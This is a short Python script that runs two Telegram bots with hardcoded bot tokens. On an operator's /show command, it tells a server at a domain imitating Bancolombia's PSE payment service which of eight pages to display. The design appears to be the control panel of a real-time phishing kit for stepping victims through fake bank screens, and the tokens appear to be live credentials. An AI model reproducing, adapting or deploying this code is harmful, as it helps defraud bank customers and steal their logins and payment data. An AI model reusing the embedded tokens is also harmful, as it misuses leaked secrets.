import telebot
import requests
import threading
# Credenciales de los bots
BOTS = [
    {"token": "7993642572:AAHJmZ3dy5lEsQi81vpUqKAI-WmacV3YlDI", "server_url": "https://mispagospsebancolombia.onrender.com/setPage"},
    {"token": "7323621941:AAHMKt0uyvD6XZsP6xvw4Pus7XvFjz0q4nY", "server_url": "https://mispagospsebancolombia.onrender.com/setPage"}
]

# Diccionario para manejar múltiples bots
bots = {bot["token"]: telebot.TeleBot(bot["token"]) for bot in BOTS}

def iniciar_bot(token, server_url):
    bot = bots[token]

    @bot.message_handler(commands=["start"])
    def send_welcome(message):
        bot.reply_to(message, "¡Hola! Usa /show para cambiar de página.")

    @bot.message_handler(commands=["show"])
    def cambiar_pagina(message):
        try:
            partes = message.text.split()
            if len(partes) < 2:
                bot.reply_to(message, "⚠️ Uso correcto: /show pag1|pag2|pag3|pag4|pag5|pag6|pag7|pag8")
                return

            pagina = partes[1]
            paginas_validas = ["pag1", "pag2", "pag3", "pag4", "pag5", "pag6", "pag7", "pag8"]

            if pagina in paginas_validas:
                print(f"🔄 Enviando solicitud para cambiar página a {pagina}")
                response = requests.post(server_url, json={"pagina": pagina})
                print(f"📡 Respuesta del servidor: {response.status_code} - {response.text}")

                if response.status_code == 200:
                    bot.reply_to(message, f"✅ Página cambiada a {pagina}")
                else:
                    bot.reply_to(message, f"❌ Error al cambiar la página. Código: {response.status_code}")
            else:
                bot.reply_to(message, "⚠️ Página inválida. Usa: /show pag1|pag2|pag3|pag4|pag5|pag6|pag7|pag8")

        except Exception as e:
            bot.reply_to(message, f"❌ Ocurrió un error: {str(e)}")
            print(f"❌ Error en el bot {token}: {e}")

    print(f"🤖 Bot con token {token} iniciado.")
    bot.polling()

# Iniciar cada bot en un hilo separado
import threading

for bot in BOTS:
    threading.Thread(target=iniciar_bot, args=(bot["token"], bot["server_url"])).start()